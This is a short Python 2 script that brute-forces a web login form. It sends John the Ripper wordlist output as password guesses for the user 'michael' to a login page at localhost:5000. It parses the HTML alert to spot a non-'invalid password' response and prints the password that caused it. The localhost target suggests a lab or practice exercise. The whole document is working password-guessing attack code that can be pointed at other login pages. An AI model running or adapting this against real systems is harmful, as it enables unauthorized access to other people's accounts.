#!/usr/bin/env python
#
# **This script must be run with PYTHON2, *NOT* python3**
#
# This script loops over passwords piped to the program on
# stdin until the alert either does not contain the text
# 'invalid password', the alert is not present, or an
# exception occurs processing the alert HTML element.
# When one of these events occurs, the password that
# causes this event is printed, and the script terminates.
#
# The script was written in this way because it is
# hard to automate checking for successful login without
# knowing what the HTTP POST response will look like
# in the case of a successful login.
#
# Usage (must use python 2):
# $ john --wordlist=<path to wordlist> --rules --stdout | python find_password.py

from __future__ import print_function
# python 2 specific
from future_builtins import map

import sys
import requests
from bs4 import BeautifulSoup

username = 'michael'

url = 'http://localhost:5000/login'
print('Making POST requests to {}.'.format(url))

passwords_tried = 0

for password in map(str.rstrip, sys.stdin):
    data = {
        'username': username,
        'password': password
    }

    res = requests.post(url, data=data)

    if res.status_code >= 400:
        print('Error: Received error status code: {}'.format(res.status_code))
        exit(1)

    soup = BeautifulSoup(res.text, 'html.parser')
    alerts = soup.findAll('div', {'class': 'alert alert-info'})

    if len(alerts) < 1:
        print('The alert for invalid password not found')
        print(password)
        print('This happened with "{}" as the password'.format(password))
        exit(0)

    alert = alerts[0]

    try:
        alert_text = alert.contents[2].strip().lower()
    except Exception as e:
        print('An exception occurred:')
        print(e)
        print('This may or may not mean success')
        print(password)
        print('This happened with "{}" as the password'.format(password))
        exit(0)

    if 'invalid password' not in alert_text:
        print('The alert exists but is not an alert about an invalid password')
        print('This may or may not mean success')
        print(password)
        print('This happened with "{}" as the password'.format(password))
        exit(0)

    passwords_tried += 1
    if passwords_tried % 1000 == 0:
        print('{} passwords tried so far.'.format(passwords_tried))

print(passwords_tried)
print('\nFailed: Finished processing all candidate passwords with no success.')
exit(1)
